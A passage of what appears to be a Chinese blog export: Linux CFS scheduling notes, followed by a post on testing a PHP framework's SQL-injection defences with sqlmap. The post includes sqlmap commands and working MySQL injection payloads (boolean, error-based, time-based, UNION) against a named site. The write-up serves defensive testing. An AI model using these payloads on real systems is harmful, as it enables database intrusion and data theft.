id=\"2-进程调度策略\"><a href=\"#2-进程调度策略\" class=\"headerlink\" title=\"2. 进程调度策略\"></a>2. 进程调度策略</h4><p>调度策略通常要在两个矛盾的目标总结寻找平衡感：进程响应速度（响应时间短）和最大系统利用率（高吞吐量）。</p>\n<h4 id=\"3-进程优先级\"><a href=\"#3-进程优先级\" class=\"headerlink\" title=\"3. 进程优先级\"></a>3. 进程优先级</h4><p>调度算法中最基本的一类就是基于优先级调度。优先级高的进程先运行，低的后运行。相同优先级轮转调度。<br>Linux采用了两种不同的优先级范围：<br>第一种是nice值，它的范围从<code>-20</code>到<code>+19</code>,默认值为0，越大优先级越低（nice可以理解为对其他进程的友好程度）。 </p>\n<blockquote>\n<p>可以通过<code>ps -el</code>查看nice值  </p>\n</blockquote>\n<p>第二种范围是实时优先级，其值是可配置的。默认情况下变化范围从0到99，越高进程优先级越高。</p>\n<h4 id=\"4-时间片概念\"><a href=\"#4-时间片概念\" class=\"headerlink\" title=\"4. 时间片概念\"></a>4. 时间片概念</h4><p>除了优先级，另外一个很重要的指标就是时间片。它标明进程在被抢占前所能持续运行的时间。调度策略必须规定一个默认的时间片，但这不是一件简单的事。<br>时间片过长会导致系统对交互的响应表现欠佳，让人觉得系统无法并发执行应用程序；时间片太短会明显增大进程切换带来的处理器耗时，因为肯定会有相当一部分系统时间用在进程切换上，而这些进程能够用来运行的时间片却很短。</p>\n<h3 id=\"二、Unix系统中的进程调度\"><a href=\"#二、Unix系统中的进程调度\" class=\"headerlink\" title=\"二、Unix系统中的进程调度\"></a>二、Unix系统中的进程调度</h3><p>在讨论公平调度算法前，我们必须首先认识一下传统Unix系统的调度过程。现代进程调度器有两个通用的概念（上面提到的）：进程优先级和时间片。优先级以nice值形式输出给用户空间。<br>优先级越高的进程赋予的时间片越多，可以简单理解一个优先级与时间片的映射，比如noce值为0（最高优先级）对应100ms的时间片，nice值为+20（最低优先级）对应5ms的时间片。每一个nice值对应一个时间片长度。<br>但是，这种方式听起来简单也很好理解，但会引发很多反常问题:</p>\n<ol>\n<li>若要将nice值映射到时间片，就必然需要将nice单位值对于到处理器的绝对时间，但这样做将会导致经常切换无法最优进行。举例说明：<br>假设有两个可运行状态的进程，nice值分别为0（对应100ms）和+20（对应5ms），两个进程分别获得的20/21(100ms)的处理器时间，和1/21(5ms)的处理器时间。<br> 另一种情况，如果是两个同等优先级的进程各自能获得一般的处理器时间，对于两个nice值为+20的每次能获得50%的处理器时间，即5ms。<br>相比刚才例子中105ms内进行一次上下文切换，想着则需要在10ms内继续进行两次上下文切换。<strong>显然，我们看到这些时间片的分配方式并不是很理想：它们是给定nice值到时间片映射与进程运行优先级混合的共同作用结果。</strong></li>\n<li>nice值与时间片映射关系合理性问题。假如nice值0和1，被分别映射到时间片100ms和95ms，它们的时间片几乎一样，假设18和19的nice值分别映射为10ms和5ms，那么前者相比后者获得了两倍的处理器时间！把进程的nice值减小1所带来的效果极大地取决于其nice初始值。</li>\n</ol>\n<h2 id=\"三、CFS公平调度\"><a href=\"#三、CFS公平调度\" class=\"headerlink\" title=\"三、CFS公平调度\"></a>三、CFS公平调度</h2><h3 id=\"1-概念\"><a href=\"#1-概念\" class=\"headerlink\" title=\"1. 概念\"></a>1. 概念</h3><p>对于上述的问题，CFS采用的方式是对时间片分配方式进行根本性的重新设计：<strong>完全摒弃时间片而是分配给进程一个处理器使用比重。</strong>通俗来讲，废弃nice值对应时间片的映射，而是采用nice值权重来分配处理器时间。<br>先看两个概念：   </p>\n<ul>\n<li>目标延迟：权重的时间分母值，每个进程按其权重在目标延迟时间内的长短，比如目标延迟为20ms，则每个进程根据权重分配20ms中的时间；   </li>\n<li>最小粒度：每个进程按权重分配后得到的时间片不能小于最小粒度，默认是1ms，就是每个进程最低也能获得1ms的时间片执行时间。  </li>\n</ul>\n<h3 id=\"2-实现\"><a href=\"#2-实现\" class=\"headerlink\" title=\"2. 实现\"></a>2. 实现</h3><p>CFS调度算法相关代码位于文件<code>kernel/sched_fair.c</code>中，核心关注四个组成部分：</p>\n<h4 id=\"2-1-时间记账\"><a href=\"#2-1-时间记账\" class=\"headerlink\" title=\"2.1 时间记账\"></a>2.1 时间记账</h4><p>所有的调度器都必须对进程运行时间做记账。<br>CFS使用调度器实体结构（<code>struct_sched_entity</code>）来追踪进程运行记账：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> sched_entity&#123;</div><div class=\"line\">    ...</div><div class=\"line\">    u64   vruntime;</div><div class=\"line\">    ...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><code>vruntime</code>变量存放进程的虚拟运行时间，该运行时间的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位。</p>\n<h4 id=\"2-2-进程调度\"><a href=\"#2-2-进程调度\" class=\"headerlink\" title=\"2.2 进程调度\"></a>2.2 进程调度</h4><p>当CFS需要选择下一个运行进程时，它会挑一个具有最小vruntime的进程。这其实就是CFS调度算法的核心：<strong>选择具有最小vruntime的任务。</strong><br>CFS使用<strong>红黑树</strong>来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。（注：每个nice值维护一个红黑树）<br>红黑树相关维护操作：  </p>\n<ul>\n<li>挑选下一个任务：选取待运行的下一个进程，是所有vruntime最小的那个，它对于的便是树中最左侧的叶子结点。</li>\n<li>先树中加入进程：但进程变为可运行状态或者是通过fork()调用第一次创建时执行。</li>\n<li>从书中删除进程：发生在进程堵塞或者终止时</li>\n</ul>\n<h4 id=\"2-3-调度器入口\"><a href=\"#2-3-调度器入口\" class=\"headerlink\" title=\"2.3 调度器入口\"></a>2.3 调度器入口</h4><p>进程调度的主要入口是函数<code>schedule()</code>，该函数中唯一重要的事情是，它会调用<code>pick_next_task()</code>。<code>pick_next_task()</code>会以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度器类中，选择最高优先级的进程：</p>\n<blockquote>\n<p><a href=\"http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259\" target=\"_blank\" rel=\"external\">http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259</a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">* Pick up the highest-prio task:</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> task_struct *</span></div><div class=\"line\"><span class=\"title\">pick_next_task</span><span class=\"params\">(<span class=\"keyword\">struct</span> rq *rq, <span class=\"keyword\">struct</span> task_struct *prev, <span class=\"keyword\">struct</span> pin_cookie cookie)</span></div><div class=\"line\">&#123;</div><div class=\"line\">\t <span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> sched_class *<span class=\"keyword\">class</span> = &amp;fair_sched_class;</div><div class=\"line\">\t <span class=\"keyword\">struct</span> task_struct *p;</div><div class=\"line\"></div><div class=\"line\">\t <span class=\"comment\">/*</span></div><div class=\"line\">\t  * Optimization: we know that if all tasks are in</div><div class=\"line\">\t  * the fair class we can call that function directly:</div><div class=\"line\">\t  */</div><div class=\"line\">\t <span class=\"keyword\">if</span> (likely(prev-&gt;sched_class == <span class=\"keyword\">class</span> &amp;&amp;</div><div class=\"line\">\t\t\t\trq-&gt;nr_running == rq-&gt;cfs.h_nr_running)) &#123;</div><div class=\"line\">\t\t\t p = fair_sched_class.pick_next_task(rq, prev, cookie);</div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (unlikely(p == RETRY_TASK))</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">goto</span> again;</div><div class=\"line\"></div><div class=\"line\">\t\t\t <span class=\"comment\">/* assumes fair_sched_class-&gt;next == idle_sched_class */</span></div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (unlikely(!p))</div><div class=\"line\">\t\t\t\t\t p = idle_sched_class.pick_next_task(rq, prev, cookie);</div><div class=\"line\"></div><div class=\"line\">\t\t\t <span class=\"keyword\">return</span> p;</div><div class=\"line\">\t &#125;</div><div class=\"line\"></div><div class=\"line\">again:</div><div class=\"line\">\t for_each_class(<span class=\"keyword\">class</span>) &#123;</div><div class=\"line\">\t\t\t p = <span class=\"keyword\">class</span>-&gt;pick_next_task(rq, prev, cookie);</div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (p) &#123;</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">if</span> (unlikely(p == RETRY_TASK))</div><div class=\"line\">\t\t\t\t\t\t\t <span class=\"keyword\">goto</span> again;</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">return</span> p;</div><div class=\"line\">\t\t\t &#125;</div><div class=\"line\">\t &#125;</div><div class=\"line\"></div><div class=\"line\">\t BUG(); <span class=\"comment\">/* the idle class will always have a runnable task */</span></div><div class=\"line\"> &#125;</div></pre></td></tr></table></figure></p>\n</blockquote>\n<h4 id=\"2-4-睡眠和唤醒\"><a href=\"#2-4-睡眠和唤醒\" class=\"headerlink\" title=\"2.4 睡眠和唤醒\"></a>2.4 睡眠和唤醒</h4><p>休眠（被阻塞）的进程处于一个特殊的不可执行状态。<br>进程休眠有多种原因，但肯定都是为了等待一些事件。事件可能是从文件I/O读更多数据，或者是某个硬件事件。<br>休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。<br>唤醒操作通过函数<code>wake_up</code>进行，它会唤醒指定的等待队列上的所有进程。</p>\n","excerpt":"","more":"<h2 id=\"第三章：进程管理\"><a href=\"#第三章：进程管理\" class=\"headerlink\" title=\"第三章：进程管理\"></a>第三章：进程管理</h2><p><strong>简单记录看书看到的一些和自己之前理解有出入的点，做个记录：</strong></p>\n<ul>\n<li><p>进程号的最大值是多少，能否调整大小？</p>\n<blockquote>\n<p>最大进程数，默认在<code>cat /proc/sys/kernel/pid_max</code> 32768（short int短整型的最大值），可直接修改提高</p>\n</blockquote>\n</li>\n<li><p>fork()写时拷贝：只有在需要写入的时候，数据才会被复制。</p>\n</li>\n<li><p>线程在Linux中的实现，</p>\n<blockquote>\n<p>从内核的角度来说，它并没有线程这个概念。Linux把所有的线程都当作进程来实现。</p>\n</blockquote>\n</li>\n<li><p>内核是如何组织管理进程列表的？</p>\n<blockquote>\n<p>双向循环列表，why？进程本身是树状的，有继承关系，父进程、子进程、兄弟进程。</p>\n</blockquote>\n</li>\n<li><p>进程描述符的结构</p>\n<blockquote>\n<p>大约1.7KB,代码492行，接近500行！！！主要包括：打开的文件，进程的地址空间，挂起的信号，进程状态，父进程，子进程</p>\n</blockquote>\n</li>\n<li><p>虚拟地址空间和物理地址空间的区别？</p>\n</li>\n<li>各种内存malloc区别？tcmalloc,kmalloc,malloc,jemalloc</li>\n</ul>\n<h2 id=\"第四章：进程调度\"><a href=\"#第四章：进程调度\" class=\"headerlink\" title=\"第四章：进程调度\"></a>第四章：进程调度</h2><h3 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h3><h4 id=\"1-多任务系统概念\"><a href=\"#1-多任务系统概念\" class=\"headerlink\" title=\"1. 多任务系统概念\"></a>1. 多任务系统概念</h4><p>多任务系统分为：非抢占式多任务和抢占式多任务。Linux提供了抢占式多任务模式。在此模式下，由调度程序来决定什么时候停止一个进程的运行。而非抢占式多任务模式则是只能由进程自己土洞停止运行，否则一直执行。    </p>\n<h4 id=\"2-进程调度策略\"><a href=\"#2-进程调度策略\" class=\"headerlink\" title=\"2. 进程调度策略\"></a>2. 进程调度策略</h4><p>调度策略通常要在两个矛盾的目标总结寻找平衡感：进程响应速度（响应时间短）和最大系统利用率（高吞吐量）。</p>\n<h4 id=\"3-进程优先级\"><a href=\"#3-进程优先级\" class=\"headerlink\" title=\"3. 进程优先级\"></a>3. 进程优先级</h4><p>调度算法中最基本的一类就是基于优先级调度。优先级高的进程先运行，低的后运行。相同优先级轮转调度。<br>Linux采用了两种不同的优先级范围：<br>第一种是nice值，它的范围从<code>-20</code>到<code>+19</code>,默认值为0，越大优先级越低（nice可以理解为对其他进程的友好程度）。 </p>\n<blockquote>\n<p>可以通过<code>ps -el</code>查看nice值  </p>\n</blockquote>\n<p>第二种范围是实时优先级，其值是可配置的。默认情况下变化范围从0到99，越高进程优先级越高。</p>\n<h4 id=\"4-时间片概念\"><a href=\"#4-时间片概念\" class=\"headerlink\" title=\"4. 时间片概念\"></a>4. 时间片概念</h4><p>除了优先级，另外一个很重要的指标就是时间片。它标明进程在被抢占前所能持续运行的时间。调度策略必须规定一个默认的时间片，但这不是一件简单的事。<br>时间片过长会导致系统对交互的响应表现欠佳，让人觉得系统无法并发执行应用程序；时间片太短会明显增大进程切换带来的处理器耗时，因为肯定会有相当一部分系统时间用在进程切换上，而这些进程能够用来运行的时间片却很短。</p>\n<h3 id=\"二、Unix系统中的进程调度\"><a href=\"#二、Unix系统中的进程调度\" class=\"headerlink\" title=\"二、Unix系统中的进程调度\"></a>二、Unix系统中的进程调度</h3><p>在讨论公平调度算法前，我们必须首先认识一下传统Unix系统的调度过程。现代进程调度器有两个通用的概念（上面提到的）：进程优先级和时间片。优先级以nice值形式输出给用户空间。<br>优先级越高的进程赋予的时间片越多，可以简单理解一个优先级与时间片的映射，比如noce值为0（最高优先级）对应100ms的时间片，nice值为+20（最低优先级）对应5ms的时间片。每一个nice值对应一个时间片长度。<br>但是，这种方式听起来简单也很好理解，但会引发很多反常问题:</p>\n<ol>\n<li>若要将nice值映射到时间片，就必然需要将nice单位值对于到处理器的绝对时间，但这样做将会导致经常切换无法最优进行。举例说明：<br>假设有两个可运行状态的进程，nice值分别为0（对应100ms）和+20（对应5ms），两个进程分别获得的20/21(100ms)的处理器时间，和1/21(5ms)的处理器时间。<br> 另一种情况，如果是两个同等优先级的进程各自能获得一般的处理器时间，对于两个nice值为+20的每次能获得50%的处理器时间，即5ms。<br>相比刚才例子中105ms内进行一次上下文切换，想着则需要在10ms内继续进行两次上下文切换。<strong>显然，我们看到这些时间片的分配方式并不是很理想：它们是给定nice值到时间片映射与进程运行优先级混合的共同作用结果。</strong></li>\n<li>nice值与时间片映射关系合理性问题。假如nice值0和1，被分别映射到时间片100ms和95ms，它们的时间片几乎一样，假设18和19的nice值分别映射为10ms和5ms，那么前者相比后者获得了两倍的处理器时间！把进程的nice值减小1所带来的效果极大地取决于其nice初始值。</li>\n</ol>\n<h2 id=\"三、CFS公平调度\"><a href=\"#三、CFS公平调度\" class=\"headerlink\" title=\"三、CFS公平调度\"></a>三、CFS公平调度</h2><h3 id=\"1-概念\"><a href=\"#1-概念\" class=\"headerlink\" title=\"1. 概念\"></a>1. 概念</h3><p>对于上述的问题，CFS采用的方式是对时间片分配方式进行根本性的重新设计：<strong>完全摒弃时间片而是分配给进程一个处理器使用比重。</strong>通俗来讲，废弃nice值对应时间片的映射，而是采用nice值权重来分配处理器时间。<br>先看两个概念：   </p>\n<ul>\n<li>目标延迟：权重的时间分母值，每个进程按其权重在目标延迟时间内的长短，比如目标延迟为20ms，则每个进程根据权重分配20ms中的时间；   </li>\n<li>最小粒度：每个进程按权重分配后得到的时间片不能小于最小粒度，默认是1ms，就是每个进程最低也能获得1ms的时间片执行时间。  </li>\n</ul>\n<h3 id=\"2-实现\"><a href=\"#2-实现\" class=\"headerlink\" title=\"2. 实现\"></a>2. 实现</h3><p>CFS调度算法相关代码位于文件<code>kernel/sched_fair.c</code>中，核心关注四个组成部分：</p>\n<h4 id=\"2-1-时间记账\"><a href=\"#2-1-时间记账\" class=\"headerlink\" title=\"2.1 时间记账\"></a>2.1 时间记账</h4><p>所有的调度器都必须对进程运行时间做记账。<br>CFS使用调度器实体结构（<code>struct_sched_entity</code>）来追踪进程运行记账：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> sched_entity&#123;</div><div class=\"line\">    ...</div><div class=\"line\">    u64   vruntime;</div><div class=\"line\">    ...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><code>vruntime</code>变量存放进程的虚拟运行时间，该运行时间的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位。</p>\n<h4 id=\"2-2-进程调度\"><a href=\"#2-2-进程调度\" class=\"headerlink\" title=\"2.2 进程调度\"></a>2.2 进程调度</h4><p>当CFS需要选择下一个运行进程时，它会挑一个具有最小vruntime的进程。这其实就是CFS调度算法的核心：<strong>选择具有最小vruntime的任务。</strong><br>CFS使用<strong>红黑树</strong>来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。（注：每个nice值维护一个红黑树）<br>红黑树相关维护操作：  </p>\n<ul>\n<li>挑选下一个任务：选取待运行的下一个进程，是所有vruntime最小的那个，它对于的便是树中最左侧的叶子结点。</li>\n<li>先树中加入进程：但进程变为可运行状态或者是通过fork()调用第一次创建时执行。</li>\n<li>从书中删除进程：发生在进程堵塞或者终止时</li>\n</ul>\n<h4 id=\"2-3-调度器入口\"><a href=\"#2-3-调度器入口\" class=\"headerlink\" title=\"2.3 调度器入口\"></a>2.3 调度器入口</h4><p>进程调度的主要入口是函数<code>schedule()</code>，该函数中唯一重要的事情是，它会调用<code>pick_next_task()</code>。<code>pick_next_task()</code>会以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度器类中，选择最高优先级的进程：</p>\n<blockquote>\n<p><a href=\"http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259\">http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259</a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</div><div class=\"line\">* Pick up the highest-prio task:</div><div class=\"line\">*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> task_struct *</div><div class=\"line\"><span class=\"title\">pick_next_task</span><span class=\"params\">(<span class=\"keyword\">struct</span> rq *rq, <span class=\"keyword\">struct</span> task_struct *prev, <span class=\"keyword\">struct</span> pin_cookie cookie)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">\t <span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> sched_class *<span class=\"keyword\">class</span> = &amp;fair_sched_class;</div><div class=\"line\">\t <span class=\"keyword\">struct</span> task_struct *p;</div><div class=\"line\"></div><div class=\"line\">\t <span class=\"comment\">/*</div><div class=\"line\">\t  * Optimization: we know that if all tasks are in</div><div class=\"line\">\t  * the fair class we can call that function directly:</div><div class=\"line\">\t  */</span></div><div class=\"line\">\t <span class=\"keyword\">if</span> (likely(prev-&gt;sched_class == <span class=\"keyword\">class</span> &amp;&amp;</div><div class=\"line\">\t\t\t\trq-&gt;nr_running == rq-&gt;cfs.h_nr_running)) &#123;</div><div class=\"line\">\t\t\t p = fair_sched_class.pick_next_task(rq, prev, cookie);</div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (unlikely(p == RETRY_TASK))</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">goto</span> again;</div><div class=\"line\"></div><div class=\"line\">\t\t\t <span class=\"comment\">/* assumes fair_sched_class-&gt;next == idle_sched_class */</span></div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (unlikely(!p))</div><div class=\"line\">\t\t\t\t\t p = idle_sched_class.pick_next_task(rq, prev, cookie);</div><div class=\"line\"></div><div class=\"line\">\t\t\t <span class=\"keyword\">return</span> p;</div><div class=\"line\">\t &#125;</div><div class=\"line\"></div><div class=\"line\">again:</div><div class=\"line\">\t for_each_class(<span class=\"keyword\">class</span>) &#123;</div><div class=\"line\">\t\t\t p = <span class=\"keyword\">class</span>-&gt;pick_next_task(rq, prev, cookie);</div><div class=\"line\">\t\t\t <span class=\"keyword\">if</span> (p) &#123;</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">if</span> (unlikely(p == RETRY_TASK))</div><div class=\"line\">\t\t\t\t\t\t\t <span class=\"keyword\">goto</span> again;</div><div class=\"line\">\t\t\t\t\t <span class=\"keyword\">return</span> p;</div><div class=\"line\">\t\t\t &#125;</div><div class=\"line\">\t &#125;</div><div class=\"line\"></div><div class=\"line\">\t BUG(); <span class=\"comment\">/* the idle class will always have a runnable task */</span></div><div class=\"line\"> &#125;</div></pre></td></tr></table></figure></p>\n</blockquote>\n<h4 id=\"2-4-睡眠和唤醒\"><a href=\"#2-4-睡眠和唤醒\" class=\"headerlink\" title=\"2.4 睡眠和唤醒\"></a>2.4 睡眠和唤醒</h4><p>休眠（被阻塞）的进程处于一个特殊的不可执行状态。<br>进程休眠有多种原因，但肯定都是为了等待一些事件。事件可能是从文件I/O读更多数据，或者是某个硬件事件。<br>休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。<br>唤醒操作通过函数<code>wake_up</code>进行，它会唤醒指定的等待队列上的所有进程。</p>\n"},{"title":"sqlmap使用心得","date":"2017-01-13T10:44:31.000Z","_content":"\n\n## 缘由\n今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。\n主要测试内容：\n- 直接用`select * from table where id={$id}`看sqlmap工具效果\n- 使用`real_escape_string`过滤测试效果\n- 使用php的`addslashes`方法测试效果\n\n## 下载\n> http://sqlmap.org/\n\n---\n\nsqlmp参数说明，直接`sqlmap.py -h`看介绍。\n- --dbms 指定数据库\n- --level=LEVEL\n\n\n## 模拟有sql注入的情况\n\n测试接口：\n> ./sqlmap.py -u \"http://wufazuce.com/index.php?time=1\"\n\n```\nsqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:\n---\nParameter: time (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)\n    Payload: time=1 OR NOT 5138=5138#\n\n    Type: error-based\n    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)\n    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: time=1 OR SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: time=1 UNION ALL SELECT CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe\n---\nweb application technology: PHP 5.6.22\nback-end DBMS: MySQL >= 5.5\n```\n\n## 使用`real_escape_string`过滤测试效果\nphp中`real_escape_string`可以过滤防范。\n> /sqlmap.py -u \"http://wufazuce.com/finc/perform/trend?time=1\"  --level=5 --dbms=mysql\n\n```\n[18:01:18] [INFO] testing connection to the target URL\n[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[18:01:18] [INFO] testing if the target URL is stable\n[18:01:19] [INFO] target URL is stable\n[18:01:19] [INFO] testing if GET parameter 'time' is dynamic\n[18:01:19] [INFO] confirming that GET parameter 'time' is dynamic\n[18:01:19] [INFO] GET parameter 'time' is dynamic\n[18:01:19] [WARNING] reflective value(s) found and filtering out\n[18:01:19] [INFO] heuristic (basic) test shows that GET parameter 'time' might be injectable\n[18:01:19] [INFO] testing for SQL injection on GET parameter 'time'\n[18:01:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[18:01:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'\n[18:01:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[18:01:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[18:01:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'\n[18:01:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[18:01:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'\n[18:01:21] [INFO] testing 'MySQL inline queries'\n[18:01:21] [INFO] testing 'PostgreSQL inline queries'\n[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'\n[18:01:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\n[18:01:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'\n[18:01:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'\n[18:01:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[18:01:22] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'\n[18:01:22] [INFO] testing 'Oracle AND time-based blind'\n[18:01:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'\n[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'\n[18:01:25] [WARNING] GET parameter 'time' does not seem to be injectable\n[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')\n\n```\n\n## 使用php的`addslashes`方法测试效果\n`addslashes`方法前后不会自动加单引号`''`\n\n## 感受\n工具很强大，自己只用了点皮毛，后面有时间再深入研究。\n\n## 参考资料\n- Web安全之SQL注入攻击技巧与防范(http://www.plhwin.com/2014/06/13/web-security-sql/)\n- 是否足够安全http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string\n","source":"_posts/sqlmap使用心得.md","raw":"---\ntitle: sqlmap使用心得\ndate: 2017-01-13 18:44:31\ncategories: MySQL\n---\n\n\n## 缘由\n今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。\n主要测试内容：\n- 直接用`select * from table where id={$id}`看sqlmap工具效果\n- 使用`real_escape_string`过滤测试效果\n- 使用php的`addslashes`方法测试效果\n\n## 下载\n> http://sqlmap.org/\n\n---\n\nsqlmp参数说明，直接`sqlmap.py -h`看介绍。\n- --dbms 指定数据库\n- --level=LEVEL\n\n\n## 模拟有sql注入的情况\n\n测试接口：\n> ./sqlmap.py -u \"http://wufazuce.com/index.php?time=1\"\n\n```\nsqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:\n---\nParameter: time (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)\n    Payload: time=1 OR NOT 5138=5138#\n\n    Type: error-based\n    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)\n    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: time=1 OR SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: time=1 UNION ALL SELECT 